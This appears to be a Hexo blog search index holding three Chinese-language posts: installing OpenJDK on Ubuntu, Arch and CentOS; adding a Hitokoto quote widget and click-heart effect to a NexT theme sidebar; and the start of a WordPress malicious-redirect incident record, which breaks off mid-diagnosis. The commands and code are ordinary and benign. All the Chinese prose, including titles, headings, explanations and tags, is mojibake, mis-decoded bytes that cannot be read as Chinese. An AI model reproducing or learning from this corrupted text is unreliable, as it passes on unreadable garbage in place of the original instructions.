<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Linuxä¸‹å®‰è£…Javaç¯å¢ƒ</title>
    <url>/37b6e877/</url>
    <content><![CDATA[<h2 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a>Ubuntu</h2><h3 id="æœç´¢åŒ…"><a href="#æœç´¢åŒ…" class="headerlink" title="æœç´¢åŒ…"></a>æœç´¢åŒ…</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt update &amp;&amp; apt search openjdk</span><br></pre></td></tr></table></figure>

<h3 id="å®‰è£…æ‰€éœ€ç‰ˆæœ¬"><a href="#å®‰è£…æ‰€éœ€ç‰ˆæœ¬" class="headerlink" title="å®‰è£…æ‰€éœ€ç‰ˆæœ¬"></a>å®‰è£…æ‰€éœ€ç‰ˆæœ¬</h3><blockquote>
<p>è¿™é‡Œå®‰è£…çš„æ˜¯<code>Java17</code>æ— å¤´ç‰ˆæœ¬, æœ‰æ›´å°‘çš„ä¾èµ–æ€§å’Œæ›´å°‘çš„ç³»ç»Ÿèµ„æºå ç”¨, è¾ƒé€‚åˆæœåŠ¡å™¨ä½¿ç”¨.</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install -y openjdk-17-jre-headless</span><br><span class="line">apt install -y openjdk-11-jre-headless</span><br></pre></td></tr></table></figure>

<h3 id="æŸ¥çœ‹å®‰è£…ä½ç½®"><a href="#æŸ¥çœ‹å®‰è£…ä½ç½®" class="headerlink" title="æŸ¥çœ‹å®‰è£…ä½ç½®"></a>æŸ¥çœ‹å®‰è£…ä½ç½®</h3><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">tree -L <span class="number">1</span> <span class="regexp">/usr/</span>lib/jvm</span><br></pre></td></tr></table></figure>

<figure class="highlight subunit"><table><tr><td class="code"><pre><span class="line">/usr/lib/jvm</span><br><span class="line">â”œâ”€â”€ java<span class="string">-1</span>.11.0-openjdk-amd64 -&gt; java<span class="string">-11</span>-openjdk-amd64</span><br><span class="line">â”œâ”€â”€ java<span class="string">-1</span>.17.0-openjdk-amd64 -&gt; java<span class="string">-17</span>-openjdk-amd64</span><br><span class="line">â”œâ”€â”€ java<span class="string">-11</span>-openjdk-amd64</span><br><span class="line">â””â”€â”€ java<span class="string">-17</span>-openjdk-amd64</span><br></pre></td></tr></table></figure>

<h3 id="åˆ‡æ¢é»˜è®¤ç‰ˆæœ¬"><a href="#åˆ‡æ¢é»˜è®¤ç‰ˆæœ¬" class="headerlink" title="åˆ‡æ¢é»˜è®¤ç‰ˆæœ¬"></a>åˆ‡æ¢é»˜è®¤ç‰ˆæœ¬</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">update</span><span class="operator">-</span>alternatives <span class="comment">--config java</span></span><br><span class="line"><span class="keyword">update</span><span class="operator">-</span>alternatives <span class="comment">--config javac</span></span><br></pre></td></tr></table></figure>

<h2 id="ArchLinux"><a href="#ArchLinux" class="headerlink" title="ArchLinux"></a>ArchLinux</h2><h3 id="æœç´¢åŒ…-1"><a href="#æœç´¢åŒ…-1" class="headerlink" title="æœç´¢åŒ…"></a>æœç´¢åŒ…</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pacman -Syu</span><br><span class="line">pacman -Ss openjdk</span><br></pre></td></tr></table></figure>

<h3 id="å®‰è£…æ‰€éœ€ç‰ˆæœ¬-1"><a href="#å®‰è£…æ‰€éœ€ç‰ˆæœ¬-1" class="headerlink" title="å®‰è£…æ‰€éœ€ç‰ˆæœ¬"></a>å®‰è£…æ‰€éœ€ç‰ˆæœ¬</h3><figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">pacman -Sy <span class="keyword">jre17-openjdk-headless</span></span><br><span class="line"><span class="keyword"></span>pacman -Sy <span class="keyword">jre8-openjdk-headless</span></span><br></pre></td></tr></table></figure>

<h3 id="åˆ‡æ¢ç‰ˆæœ¬"><a href="#åˆ‡æ¢ç‰ˆæœ¬" class="headerlink" title="åˆ‡æ¢ç‰ˆæœ¬"></a>åˆ‡æ¢ç‰ˆæœ¬</h3><p>æŸ¥çœ‹å·²å®‰è£…Javaç¯å¢ƒå’Œå½“å‰é»˜è®¤ä½¿ç”¨</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">archlinux-java status</span></span><br></pre></td></tr></table></figure>

<p>åˆ‡æ¢å¯¹åº”Javaç‰ˆæœ¬</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo archlinux-java <span class="built_in">set</span> java-8-openjdk/jre</span><br></pre></td></tr></table></figure>

<p><img data-src="http://img.owq.world/2022/09/0131-3aad7c.png"></p>
<h2 id="CentOS"><a href="#CentOS" class="headerlink" title="CentOS"></a>CentOS</h2><h3 id="æœç´¢åŒ…-2"><a href="#æœç´¢åŒ…-2" class="headerlink" title="æœç´¢åŒ…"></a>æœç´¢åŒ…</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum update</span><br><span class="line">yum list *openjdk*</span><br></pre></td></tr></table></figure>

<h3 id="å®‰è£…æ‰€éœ€ç‰ˆæœ¬-2"><a href="#å®‰è£…æ‰€éœ€ç‰ˆæœ¬-2" class="headerlink" title="å®‰è£…æ‰€éœ€ç‰ˆæœ¬"></a>å®‰è£…æ‰€éœ€ç‰ˆæœ¬</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install -y java-17-openjdk-headless.x86_64</span><br><span class="line">yum install -y java-1.8.0-openjdk-headless.x86_64</span><br></pre></td></tr></table></figure>

<h3 id="åˆ‡æ¢ç‰ˆæœ¬-1"><a href="#åˆ‡æ¢ç‰ˆæœ¬-1" class="headerlink" title="åˆ‡æ¢ç‰ˆæœ¬"></a>åˆ‡æ¢ç‰ˆæœ¬</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">alternatives --config java</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>å­¦ä¹ æ•™ç¨‹</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Liunx</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo NexTä¸»é¢˜ä¾§è¾¹æ æ·»åŠ ä¸€è¨€</title>
    <url>/5313cb7/</url>
    <content><![CDATA[<h2 id="å¤§è‡´æµç¨‹"><a href="#å¤§è‡´æµç¨‹" class="headerlink" title="å¤§è‡´æµç¨‹"></a>å¤§è‡´æµç¨‹</h2><figure class="highlight clean"><table><tr><td class="code"><pre><span class="line">æ·»åŠ ä¾§è¾¹æ  -&gt; æ·»åŠ CSS -&gt; æ¿€æ´»é…ç½® -&gt; åŒæ­¥å®Œå·¥</span><br></pre></td></tr></table></figure>

<h2 id="æ¼”ç¤ºæ•ˆæœ"><a href="#æ¼”ç¤ºæ•ˆæœ" class="headerlink" title="æ¼”ç¤ºæ•ˆæœ"></a>æ¼”ç¤ºæ•ˆæœ</h2><img data-src="https://img.owq.world/2022/08/1356-4d4251.gif" style="zoom:80%;" />

<h2 id="æ·»åŠ ä¸€è¨€æ’ä»¶"><a href="#æ·»åŠ ä¸€è¨€æ’ä»¶" class="headerlink" title="æ·»åŠ ä¸€è¨€æ’ä»¶"></a>æ·»åŠ ä¸€è¨€æ’ä»¶</h2><p>ç¼–è¾‘<code>themes/next/layout/_custom/sidebar.swig</code>æ–‡ä»¶, è‹¥æ— åˆ™åˆ›å»º.</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- hitokoto --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">strong</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;hitokoto_wrap&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;hitokoto_text&quot;</span>&gt;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span>æŠ¬å¤´æœ›å¤©ï¼Œä½å¤´èµ°è·¯ã€‚<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;hitokoto_from&quot;</span>&gt;</span>â€”â€”æ— å<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">strong</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> hitokoto_wrap = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;hitokoto_wrap&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> hitokoto_text = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;hitokoto_text&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> hitokoto_from = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;hitokoto_from&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">loadHitokoto</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// Fetch API</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// è°ƒç”¨ä¸€è¨€æ¥å£ æ ¹æ®éœ€æ±‚é…ç½®å‚æ•° é»˜è®¤å³å¯</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// fetch(&#x27;https://v1.hitokoto.cn?min_length=12&#x27;)</span></span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">fetch</span>(<span class="string">&#x27;https://international.v1.hitokoto.cn?min_length=12&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">        .<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> response.<span class="title function_">json</span>())</span></span><br><span class="line"><span class="language-javascript">        .<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            hitokoto_text.<span class="property">innerText</span> = <span class="string">&#x27;\xa0\xa0\xa0\xa0\xa0\xa0\xa0&#x27;</span> + data.<span class="property">hitokoto</span>;</span></span><br><span class="line"><span class="language-javascript">            hitokoto_from.<span class="property">innerText</span> = <span class="string">&quot;â€”â€”&quot;</span> + data.<span class="property">from</span> + <span class="string">&#x27;\xa0&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;)</span></span><br><span class="line"><span class="language-javascript">        .<span class="title function_">catch</span>(<span class="variable language_">console</span>.<span class="property">error</span>)</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">loadHitokoto</span>();</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    hitokoto_wrap.<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span>(<span class="params">e</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">loadHitokoto</span>();</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// å¤åˆ¶ä¸€è¨€å†…å®¹åˆ°å‰ªè´´æ¿</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// å»é™¤å­—ç¬¦ä¸²å‰åç©ºæ ¼</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">let</span> content = (hitokoto_text.<span class="property">innerText</span> + hitokoto_from.<span class="property">innerText</span>).<span class="title function_">trim</span>()</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// Clipboard API</span></span></span><br><span class="line"><span class="language-javascript">        navigator.<span class="property">clipboard</span>.<span class="title function_">writeText</span>(content)</span></span><br><span class="line"><span class="language-javascript">        .<span class="title function_">then</span>(<span class="variable language_">console</span>.<span class="title function_">log</span>(content))</span></span><br><span class="line"><span class="language-javascript">        .<span class="title function_">catch</span>(<span class="variable language_">console</span>.<span class="property">error</span>)</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="æ·»åŠ ç‚¹å‡»çˆ±å¿ƒç‰¹æ•ˆ"><a href="#æ·»åŠ ç‚¹å‡»çˆ±å¿ƒç‰¹æ•ˆ" class="headerlink" title="æ·»åŠ ç‚¹å‡»çˆ±å¿ƒç‰¹æ•ˆ"></a>æ·»åŠ ç‚¹å‡»çˆ±å¿ƒç‰¹æ•ˆ</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="comment">// æ·»åŠ é¼ æ ‡ç‚¹å‡»çˆ±å¿ƒç‰¹æ•ˆ</span></span></span><br><span class="line"><span class="language-javascript">    !<span class="keyword">function</span>(<span class="params">e, t, a</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">r</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">for</span> (<span class="keyword">var</span> e = <span class="number">0</span>; e &lt; s.<span class="property">length</span>; e++) s[e].<span class="property">alpha</span> &lt;= <span class="number">0</span> ? (t.<span class="property">body</span>.<span class="title function_">removeChild</span>(s[e].<span class="property">el</span>), s.<span class="title function_">splice</span>(e, <span class="number">1</span>)) : (s[e].<span class="property">y</span>--, s[e].<span class="property">scale</span> += <span class="number">.004</span>, s[e].<span class="property">alpha</span> -= <span class="number">.013</span>, s[e].<span class="property">el</span>.<span class="property">style</span>.<span class="property">cssText</span> = <span class="string">&quot;left:&quot;</span> + s[e].<span class="property">x</span> + <span class="string">&quot;px;top:&quot;</span> + s[e].<span class="property">y</span> + <span class="string">&quot;px;opacity:&quot;</span> + s[e].<span class="property">alpha</span> + <span class="string">&quot;;transform:scale(&quot;</span> + s[e].<span class="property">scale</span> + <span class="string">&quot;,&quot;</span> + s[e].<span class="property">scale</span> + <span class="string">&quot;) rotate(45deg);background:&quot;</span> + s[e].<span class="property">color</span> + <span class="string">&quot;;z-index:99999&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">requestAnimationFrame</span>(r)</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">n</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> t = <span class="string">&quot;function&quot;</span> == <span class="keyword">typeof</span> e.<span class="property">onclick</span> &amp;&amp; e.<span class="property">onclick</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// ç»‘å®šç‚¹å‡»äº‹ä»¶åˆ°ä¸€è¨€çª—å£</span></span></span><br><span class="line"><span class="language-javascript">            hitokoto_wrap.<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                t &amp;&amp; <span class="title function_">t</span>(),</span></span><br><span class="line"><span class="language-javascript">                    <span class="title function_">o</span>(e)</span></span><br><span class="line"><span class="language-javascript">            &#125;);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">c</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">return</span> <span class="string">&quot;rgb(&quot;</span> + ~~ (<span class="number">255</span> * <span class="title class_">Math</span>.<span class="title function_">random</span>()) + <span class="string">&quot;,&quot;</span> + ~~ (<span class="number">255</span> * <span class="title class_">Math</span>.<span class="title function_">random</span>()) + <span class="string">&quot;,&quot;</span> + ~~ (<span class="number">255</span> * <span class="title class_">Math</span>.<span class="title function_">random</span>()) + <span class="string">&quot;)&quot;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">o</span>(<span class="params">e</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> a = t.<span class="title function_">createElement</span>(<span class="string">&quot;div&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            a.<span class="property">className</span> = <span class="string">&quot;heart&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                s.<span class="title function_">push</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="attr">el</span>: a,</span></span><br><span class="line"><span class="language-javascript">                    <span class="attr">x</span>: e.<span class="property">clientX</span> - <span class="number">5</span>,</span></span><br><span class="line"><span class="language-javascript">                    <span class="attr">y</span>: e.<span class="property">clientY</span> - <span class="number">5</span>,</span></span><br><span class="line"><span class="language-javascript">                    <span class="attr">scale</span>: <span class="number">1</span>,</span></span><br><span class="line"><span class="language-javascript">                    <span class="attr">alpha</span>: <span class="number">1</span>,</span></span><br><span class="line"><span class="language-javascript">                    <span class="attr">color</span>: <span class="title function_">c</span>()</span></span><br><span class="line"><span class="language-javascript">                &#125;),</span></span><br><span class="line"><span class="language-javascript">                t.<span class="property">body</span>.<span class="title function_">appendChild</span>(a)</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">i</span>(<span class="params">e</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> a = t.<span class="title function_">createElement</span>(<span class="string">&quot;style&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            a.<span class="property">type</span> = <span class="string">&quot;text/css&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                a.<span class="title function_">appendChild</span>(t.<span class="title function_">createTextNode</span>(e))</span></span><br><span class="line"><span class="language-javascript">            &#125; <span class="keyword">catch</span>(t) &#123;</span></span><br><span class="line"><span class="language-javascript">                a.<span class="property">styleSheet</span>.<span class="property">cssText</span> = e</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">            t.<span class="title function_">getElementsByTagName</span>(<span class="string">&quot;head&quot;</span>)[<span class="number">0</span>].<span class="title function_">appendChild</span>(a)</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> s = [];</span></span><br><span class="line"><span class="language-javascript">        e.<span class="property">requestAnimationFrame</span> = e.<span class="property">requestAnimationFrame</span> || e.<span class="property">webkitRequestAnimationFrame</span> || e.<span class="property">mozRequestAnimationFrame</span> || e.<span class="property">oRequestAnimationFrame</span> || e.<span class="property">msRequestAnimationFrame</span> ||</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="built_in">setTimeout</span>(e, <span class="number">1e3</span> / <span class="number">60</span>)</span></span><br><span class="line"><span class="language-javascript">            &#125;,</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">i</span>(<span class="string">&quot;.heart&#123;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);&#125;.heart:after,.heart:before&#123;content: &#x27;&#x27;;width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: fixed;&#125;.heart:after&#123;top: -5px;&#125;.heart:before&#123;left: -5px;&#125;&quot;</span>),</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">n</span>(),</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">r</span>()</span></span><br><span class="line"><span class="language-javascript">    &#125; (<span class="variable language_">window</span>, <span class="variable language_">document</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="æ¿€æ´»ä¸€è¨€çª—å£"><a href="#æ¿€æ´»ä¸€è¨€çª—å£" class="headerlink" title="æ¿€æ´»ä¸€è¨€çª—å£"></a>æ¿€æ´»ä¸€è¨€çª—å£</h2><p>ç¼–è¾‘<code>themes/next/_config.yml</code>æ–‡ä»¶</p>
<p>æ‰¾åˆ°<code>custom_file_path</code>ä¿®æ”¹<code>sidebar</code>ä¸º<code>themes/next/layout/_custom/sidebar.swig</code>, æ‰ä¼šåŠ è½½å®šåˆ¶çš„ä¾§è¾¹æ å†…å®¹.</p>
<p><img data-src="http://img.owq.world/2022/08/1341-e8a05e.png"></p>
<h2 id="æ·»åŠ ä¸€è¨€CSS"><a href="#æ·»åŠ ä¸€è¨€CSS" class="headerlink" title="æ·»åŠ ä¸€è¨€CSS"></a>æ·»åŠ ä¸€è¨€CSS</h2><p>ç¼–è¾‘<code>themes/next/source/css/_custom/custom.styl</code>æ–‡ä»¶</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">//hitokoto</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#hitokoto_wrap</span> &#123;</span><br><span class="line">  <span class="attribute">margin-top</span>: <span class="number">15px</span>;</span><br><span class="line">  <span class="attribute">cursor</span>: pointer;</span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">  <span class="attribute">flex-direction</span>: column;</span><br><span class="line">  <span class="attribute">flex-wrap</span>: nowrap;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#hitokoto_text</span> &#123;</span><br><span class="line">  <span class="attribute">text-align</span>: left;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">0.8125em</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#hitokoto_from</span> &#123;</span><br><span class="line">  <span class="attribute">text-align</span>: right;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">0.7em</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#999</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="å¯¼å…¥ä¸€è¨€CSS"><a href="#å¯¼å…¥ä¸€è¨€CSS" class="headerlink" title="å¯¼å…¥ä¸€è¨€CSS"></a>å¯¼å…¥ä¸€è¨€CSS</h2><p>ç¼–è¾‘<code>themes/next/source/css/main.styl</code>æ–‡ä»¶</p>
<p>åœ¨æœ«å°¾æ·»åŠ <code>@import &quot;_custom/custom&quot;;</code>, è¿™æ ·cssæ‰ä¼šç”Ÿæ•ˆ.</p>
<p><img data-src="http://img.owq.world/2022/08/1359-e8a23d.png"></p>
<hr>
<blockquote>
<p>æµ‹è¯•æ•ˆæœ -&gt; åŒæ­¥é…ç½® -&gt; å¤§åŠŸå‘ŠæˆğŸ‰</p>
</blockquote>
<h2 id="å‚è€ƒæ–‡æ¡£"><a href="#å‚è€ƒæ–‡æ¡£" class="headerlink" title="å‚è€ƒæ–‡æ¡£"></a>å‚è€ƒæ–‡æ¡£</h2><blockquote>
<p><span class="exturl" data-url="aHR0cHM6Ly9kZXZlbG9wZXIuaGl0b2tvdG8uY24vc2VudGVuY2UvIyVFNyVBRSU4MCVFNCVCQiU4Qg==">è¯­å¥æ¥å£ | ä¸€è¨€å¼€å‘è€…ä¸­å¿ƒ (hitokoto.cn)</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmJpbGwubW9lL2FkZC1oaXRva290by8=">ä¸ºæ‚¨çš„Hexoåšå®¢æ·»åŠ Hitokotoä¸€è¨€åŠŸèƒ½ | Bill Yang&#39;s Blog</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9qdWVqaW4uY24vcG9zdC82OTQ3OTc4MDgxMjYwNzk3OTg5">JSå®ç°é¼ æ ‡ç‚¹å‡»çˆ±å¿ƒ&amp;ç»˜åˆ¶å¤šè¾¹å½¢&amp;æ¯æ—¥ä¸€è¨€åŠŸèƒ½ - æ˜é‡‘ (juejin.cn)</span></p>
</blockquote>
]]></content>
      <categories>
        <category>åšå®¢å®šåˆ¶</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>WordPress ç«™ç‚¹æ¶æ„é‡å®šå‘è§£å†³è®°å½•</title>
    <url>/43259a0f/</url>
    <content><![CDATA[<blockquote>
<p>äº‹æƒ…èµ·å› æ˜¯è¿™æ ·çš„, å…¬å¸çš„ç½‘ç«™è¢«åŠ«æŒäº†, åœ¨å‰ç«¯è§£å†³é—®é¢˜ååˆå¤å‘å, äº‹æƒ…å°±è½åˆ°è¿™ä½å¹¸è¿å„¿èº«ä¸Šäº†~</p>
</blockquote>
<h2 id="åŠ«æŒæµç¨‹"><a href="#åŠ«æŒæµç¨‹" class="headerlink" title="åŠ«æŒæµç¨‹"></a>åŠ«æŒæµç¨‹</h2><blockquote>
<p>å…ˆçœ‹çœ‹è¢«é»‘æ˜¯ä»€ä¹ˆæ ·å­çš„.</p>
</blockquote>
<p>æ‰“å¼€ç½‘ç«™ä¼šé‡å®šå‘åˆ°é’“é±¼é¡µé¢, ç„¶åæç¤ºä½ ç‚¹å‡»&quot;å…è®¸é€šçŸ¥&quot;, å¦‚æœåœ¨è¿™é‡Œç‚¹å‡»&quot;Allow&quot;çš„è¯, çŒœæµ‹åˆ™ä¼šé€šè¿‡ç³»ç»Ÿçš„æ¶ˆæ¯é€šçŸ¥æ¥è¿›è¡Œ&quot;æ”»å‡»&quot;.<br><img data-src="http://img.owq.world/2022/06/1617-775e43.png"></p>
<blockquote>
<p>æœ€ä¸ºæœ‰è¶£çš„æ˜¯, è¿™ä¸ªé’“é±¼é¡µé¢å¾ˆ&quot;èªæ˜&quot;, å¦‚æœç­‰ä¸€æ®µæ—¶é—´(å¤§æ¦‚å‡ ç§’)æ²¡æœ‰è§ä½ ç‚¹å‡»&quot;Allow&quot;å, ä¼šéšæœºè·³è½¬åˆ°å¦å¤–ä¸€ä¸ªé’“é±¼é¡µé¢.</p>
</blockquote>
<p>åƒä¸‹å›¾è¿™æ ·çš„, ç›´æ¥å‘Šè¯‰ä½ å¯ä»¥è§£å†³åˆšåˆšå‡ºç°çš„è«åå¼¹çª—(ç¬‘), åˆ«è¯´, å¦‚æœæ˜¯ä¸ªç”µè„‘å°ç™½è¿˜çœŸä¼šä¸Šé’©, æ¯•ç«Ÿ, è¿™è¿‡ç¨‹å¾ˆ&quot;åˆç†&quot;.</p>
<p><img data-src="http://img.owq.world/2022/06/1100-be149e.png"></p>
<p>è¿™æ˜¯éšæœºè·³åˆ°çš„å¦ä¸€ä¸ªé’“é±¼é¡µé¢, ä¹Ÿæ˜¯åŒæ ·çš„å¥—è·¯.</p>
<p><img data-src="http://img.owq.world/2022/06/1100-76eb4c.png"></p>
<h2 id="å®šä½é—®é¢˜åŸå› "><a href="#å®šä½é—®é¢˜åŸå› " class="headerlink" title="å®šä½é—®é¢˜åŸå› "></a>å®šä½é—®é¢˜åŸå› </h2><ol>
<li><p>è¿™ä¸ªå¾ˆæ˜æ˜¾æ˜¯ç½‘ç«™è¢«åŠ«æŒäº†, é‚£ä¹ˆç¬¬ä¸€æ­¥è¦ç¡®è®¤æ˜¯æ€ä¹ˆè¢«åŠ«æŒäº†? æ˜¯DNSåŠ«æŒè¿˜æ˜¯ç½‘ç«™è¢«é»‘äº†?</p>
</li>
<li><p>æœªåˆ†æä¸Šé¢çš„é’“é±¼æµç¨‹å‰, ä»åˆæ­¥ä¿¡æ¯åˆ¤æ–­--&quot;æˆ‘ä»¬è‡ªå·±æ‰“å¼€ç½‘ç«™ä¸ä¼šè¢«è·³è½¬, ä½†æ˜¯åœ¨å›½å¤–å‹äººæ‰“å¼€ç½‘ç«™ä¼šè¢«è·³è½¬&quot;, å…ˆæ’é™¤æ­£ç¡®ç­”æ¡ˆ(ç½‘ç«™è¢«é»‘).</p>
<ol>
<li><p>é‚£DNSè¢«åŠ«æŒ, è¿™ä¸ªæœ‰å¯èƒ½å—?</p>
<p>è¿™é‡Œæœ‰ä¸€ä¸ªç»†èŠ‚, é’“é±¼é¡µé¢æ˜¯ç½‘ç«™æ‰“å¼€åæ‰è·³è½¬åˆ°é’“é±¼é¡µé¢, è¿™ä¸ªæ˜¯DNSåŠ«æŒä¸èƒ½åšåˆ°çš„.</p>
<p>å¾ˆå¯æƒœ, è¿™ä¸ªç»†èŠ‚è¢«å¿½ç•¥æ‰äº†, æ‰€æœ‰æœ‰äº†æ¥ä¸‹æ¥åˆ¤æ–­æ˜¯å¦å› ä¸ºDNSè¢«æ±¡æŸ“çš„æ“ä½œ.</p>
<ul>
<li><p>è®©å›½å¤–å‹äººç”¨æ‰‹æœºç½‘ç»œå»æµè§ˆé¡µé¢, çœ‹çœ‹æ˜¯å¦èƒ½æ­£å¸¸è®¿é—®, æ’é™¤åŒºåŸŸç½‘è¢«åŠ«æŒçš„å¯èƒ½.</p>
</li>
<li><p>è¿˜æ˜¯ä¸èƒ½æ­£å¸¸è®¿é—®, è¿™é‡Œå°±æå¤§å¯èƒ½æ’é™¤æ˜¯DNSæ±¡æŸ“çš„é—®é¢˜, è¿è¥å•†çš„DNSæœåŠ¡éƒ½è¢«é»‘æ‰çš„æ¦‚ç‡å¤ªä½äº†.</p>
</li>
</ul>
</li>
